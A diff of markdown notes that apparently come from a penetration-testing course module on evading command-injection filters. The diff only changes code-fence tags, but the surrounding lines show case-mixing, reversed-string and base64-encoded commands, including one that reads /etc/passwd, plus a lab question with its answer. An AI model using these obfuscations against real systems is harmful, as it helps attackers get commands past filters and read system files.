@@ -10,7 +10,7 @@ PS C:\htb> WhOaMi
 
 For Linux, we can use:
 
-```sh
+```shellsession
 $ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
 
 21y4d
@@ -18,7 +18,7 @@ $ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
 
 ## Reversed Commands
 
-```sh
+```shellsession
 $ $(rev<<<'imaohw')
 
 21y4d
@@ -31,7 +31,7 @@ PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
 
 ## Encoded Commands
 
-```sh
+```shellsession
 $ echo -n 'cat /etc/passwd | grep 33' | base64
 $ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -46,7 +46,7 @@ PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::Fr
 ## Questions
 1. Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 **Answer:**
    - Base64 encode the command:
-        ```sh
+        ```shellsession
         $ echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
         ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK
         ```
